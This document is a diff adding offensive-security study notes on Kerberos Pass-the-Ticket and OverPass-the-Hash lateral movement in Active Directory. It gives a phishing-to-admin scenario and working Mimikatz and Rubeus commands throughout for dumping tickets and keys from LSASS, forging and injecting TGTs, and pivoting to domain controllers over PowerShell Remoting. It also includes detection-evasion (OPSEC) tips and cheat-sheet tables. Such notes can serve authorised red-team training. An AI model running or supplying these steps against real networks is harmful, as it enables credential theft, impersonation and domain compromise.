@@ -1,0 +1,275 @@
+🧠 Concept Summary — What is Pass the Ticket (PtT)?
+Pass the Ticket is a Kerberos-based lateral movement technique.
+
+Unlike Pass-the-Hash (PtH), which abuses NTLM hashes, PtT uses Kerberos TGT or TGS tickets.
+
+This allows impersonation of users without knowing their plaintext credentials or NTLM hash.
+
+🔁 How Kerberos Works — Quick Refresher
+TGT (Ticket Granting Ticket): Proves identity to request other tickets.
+
+TGS (Ticket Granting Service Ticket): Grants access to a specific service.
+
+LSASS holds tickets in memory. If you have admin access, you can extract them.
+
+🎯 Attack Scenario
+You phished a user, escalated to local admin, and now you want to extract tickets and move laterally using those tickets — no password or hash required.
+
+🎣 Step 1: Harvest Kerberos Tickets
+🎯 Goal: Dump TGT or TGS from LSASS memory.
+✅ Via Mimikatz
+bash
+Copy
+Edit
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+Exports .kirbi files to disk.
+
+File names tell you what the ticket is for (e.g., krbtgt, cifs, ldap, etc.).
+
+Note: Tickets with $ = machine accounts, ignore those unless you have a use-case.
+
+✅ Via Rubeus
+bash
+Copy
+Edit
+Rubeus.exe dump /nowrap
+Dumps all tickets in Base64 format for easy import or storage.
+
+Also provides ticket info like:
+
+UserName
+
+ServiceName
+
+StartTime, EndTime, etc.
+
+🔁 Step 2: OverPass-The-Hash (a.k.a. Pass-the-Key)
+Instead of reusing an NTLM hash, you convert a Kerberos key (AES/RC4) into a forged TGT.
+
+🔍 First, Extract Kerberos Keys
+bash
+Copy
+Edit
+mimikatz # sekurlsa::ekeys
+You’ll get:
+
+aes256_hmac
+
+rc4_hmac_nt, etc.
+
+AES keys are better for stealth and modern domains; RC4 may trigger detection due to downgrade attacks.
+
+🔨 Create Fake TGT Using Keys
+✅ Mimikatz
+bash
+Copy
+Edit
+mimikatz # sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<hash>
+✅ Rubeus
+bash
+Copy
+Edit
+Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<key> /ptt
+asktgt = get TGT
+
+/ptt = immediately inject it into your session (Pass the Ticket)
+
+🧠 Pass the Ticket (PtT) – Multiple Methods
+🧾 Method 1: Rubeus + .kirbi File
+bash
+Copy
+Edit
+Rubeus.exe ptt /ticket:<ticket.kirbi>
+📋 Method 2: Rubeus + Base64 Ticket
+bash
+Copy
+Edit
+Rubeus.exe ptt /ticket:<Base64 string>
+Use PowerShell to get Base64 from file:
+
+powershell
+Copy
+Edit
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
+💥 Method 3: Mimikatz
+bash
+Copy
+Edit
+mimikatz # kerberos::ptt <ticket.kirbi>
+🧪 Optional: Spawn new shell with loaded ticket
+bash
+Copy
+Edit
+mimikatz # misc::cmd
+💻 Lateral Movement with PowerShell Remoting
+If user has Remote Management access, not necessarily admin, you can remote in:
+
+powershell
+Copy
+Edit
+Enter-PSSession -ComputerName <Target>
+✅ First, use Rubeus or Mimikatz to inject ticket
+✅ Then enter PSSession from the same CMD/PowerShell session
+✅ You’ll be acting as the ticket’s user (e.g., whoami will reflect this)
+
+🧪 BONUS: Rubeus createnetonly for stealth
+bash
+Copy
+Edit
+Rubeus.exe createnetonly /program:"cmd.exe" /show
+Spawns a new cmd with Logon Type 9 (runas /netonly equivalent).
+
+Avoids wiping current TGTs.
+
+Then run:
+
+bash
+Copy
+Edit
+Rubeus.exe asktgt /user:<user> /aes256:<key> /ptt
+Enter-PSSession -ComputerName <DC>
+🛡️ Detection & OPSEC Notes
+Injecting RC4 keys into an AES-only environment may trigger alerts.
+
+If domain supports AES (functional level 2008+), use AES256 when possible.
+
+Stealthier than PtH in some environments, especially with TGS tickets.
+
+Use logon type 9 where possible to avoid ticket overwrite.
+
+✅ TL;DR: Workflow Cheat Sheet
+Step	Tool	Command
+🧲 Dump tickets	Mimikatz	sekurlsa::tickets /export
+🧲 Dump tickets	Rubeus	dump /nowrap
+🔐 Dump Kerb keys	Mimikatz	sekurlsa::ekeys
+🎟️ Forge TGT	Rubeus	asktgt /user /aes256 /ptt
+🎟️ Inject ticket	Rubeus	ptt /ticket:<file or base64>
+🎟️ Inject ticket	Mimikatz	kerberos::ptt <ticket>
+🖥️ Lateral movement	PS	Enter-PSSession -ComputerName <DC>
+
+🔁 PtH vs. PtT — When to Use Each
+Feature	Pass the Hash (PtH)	Pass the Ticket (PtT)
+🔐 Auth Mechanism	NTLM	Kerberos
+🔑 Credential Used	NTLM hash (rc4_hmac)	Kerberos ticket (TGT/TGS)
+🧠 Knowledge Needed	NTLM hash of user	TGT/TGS or key material
+🖥️ Typical Use Case	Lateral movement to machines that accept NTLM (e.g., SMB, WMI, RDP)	Lateral movement to machines that require Kerberos-based auth (e.g., AD-integrated apps, constrained delegation scenarios)
+🧱 Barriers	May fail if SMB signing is enforced, or NTLM is disabled	May fail if tickets expire or are detected
+🔍 Detection	High — NTLM downgrade, reused hashes	Lower — if AES keys are used and ticket lifetimes are respected
+🧠 Real-World Scenario Breakdown
+🔓 Use PtH when:
+You’ve dumped NTLM hashes from LSASS or SAM.
+
+You're targeting local admin access over SMB, WMI, or WinRM.
+
+The environment supports NTLM (some modern ones don't!).
+
+E.g. You dump Administrator's NTLM hash from MS01, and use crackmapexec to log into MS02.
+
+🎟️ Use PtT when:
+You dumped a Kerberos ticket (TGT or TGS).
+
+You got Kerberos keys and want to generate a valid ticket (OverPass the Hash).
+
+You're trying to blend in with normal ticket activity or bypass NTLM restrictions.
+
+You're accessing Kerberos-only services like:
+
+SQL with integrated auth
+
+PSRemoting when NTLM is blocked
+
+Anything requiring SSO where NTLM won’t cut it
+
+E.g. You phish a user, dump their AES key, then craft a TGT using Rubeus and asktgt /ptt, and connect over PowerShell Remoting.
+
+🔀 Order of Operations Cheat Sheet
+Here’s a general flow when moving laterally post-compromise:
+
+🔹 Step 1: Local Loot
+Dump creds (mimikatz sekurlsa::logonpasswords, lsass, SAM)
+
+Dump hashes (NTLM) ✅ → PtH possible
+
+Dump tickets (sekurlsa::tickets) or keys (sekurlsa::ekeys) ✅ → PtT or OverPtH possible
+
+🔹 Step 2: Analyze
+Only got NTLM hash? → Try PtH (WMI/SMB/WinRM)
+
+Got AES256 or TGT? → Forge ticket and PtT
+
+Need to access a Kerberos-only service? → PtT is required
+
+🔹 Step 3: Execute
+Attack Style	Tool	Command
+PtH	Mimikatz	sekurlsa::pth
+PtH	CrackMapExec	cme smb with -H
+PtT	Rubeus	ptt or asktgt /ptt
+PtT	Mimikatz	kerberos::ptt
+OverPtH	Mimikatz or Rubeus	Create ticket using hash/key, then inject with PtT
+🧩 Common Gotchas
+Situation	What You Need
+No NTLM, but have Kerberos keys	Use OverPass-the-Hash → PtT
+TGT expired	Regenerate with key or get a new one from live session
+Service requires delegation	TGS tickets (Kerberos only)
+PowerShell Remoting fails with PtH	Try PtT, especially if NTLM is blocked
+SMB rejects NTLM	Try accessing over Kerberos using a forged ticket (PtT)
+🔚 Bottom Line
+PtH is quick-and-dirty, but easily caught and becoming obsolete.
+
+PtT is cleaner, fits better in modern environments, and gives access to more advanced attack paths like delegation abuse and Kerberoasting chaining.
+
+If you can get Kerberos keys or tickets — PtT is king. If all you have is a hash — PtH is your backup.
+
+🎫 Pass-the-Ticket (PtT) + Double Hop Gotcha
+✅ What’s the Problem?
+When you use Kerberos (PtT) to connect to another box (like via PSRemoting or SMB), your TGT (ticket-granting ticket) is not automatically forwarded to the remote machine.
+
+This is by design — it's a security feature of Kerberos to prevent “unintended delegation” (a.k.a. Double Hop Attacks).
+
+🔄 So What Happens?
+You PtT into DC01 with user john@domain.
+
+You run Enter-PSSession DC01.
+
+You're now on DC01 but your TGT is still only valid on MS01, where you originally injected it.
+
+Now you try to RDP, PSRemote, or connect to FS01 from DC01... fail ❌
+
+Because DC01 can’t request another service ticket on your behalf — your TGT isn’t there.
+
+💡 Your Fix = Log out → Re-Inject → Enumerate again
+🧭 Workflow:
+Inject TGT with PtT (Rubeus ptt or mimikatz kerberos::ptt)
+
+Connect to Target1 (e.g. DC01) via PSRemoting, SMB, RDP
+
+ENUM HARD AF 💥 (loot, dump, check sessions, creds, ACLs)
+
+Log out from session (e.g. exit PSRemoting, close RDP, etc.)
+
+Inject TGT or TGS for next target (FS01, SQL01, etc.)
+
+Repeat the process
+
+🧠 Bonus: Kerberos Delegation Paths = Bypass Double Hop (Advanced)
+Later you'll see:
+
+Unconstrained Delegation 🧨
+
+Constrained Delegation (S4U2Self / S4U2Proxy)
+
+Resource-Based Constrained Delegation
+
+These allow a machine or service to impersonate you to another service legally in Kerberos — that's how attackers bypass double hop in some advanced chains.
+
+But unless you’re abusing those: ➡️ You gotta bounce between sessions and inject again.
+
+🔚 TL;DR:
+💡 Point	✅ Yes or ❌ No
+Can I PtT into DC01 and use that ticket again to reach SQL01 from inside DC01?	❌ No (unless delegation abuse is possible)
+Should I inject the TGT, pivot to one box, enumerate, then exit before hitting another?	✅ Yes
+Can I inject multiple tickets at once in the same logon session?	❌ No (you’ll overwrite the last one or break stuff)
+Should I keep track of which TGTs or TGSes belong to which targets/users?	✅ Absolutely. Use naming like user@krbtgt-domain.kirbi
+
+
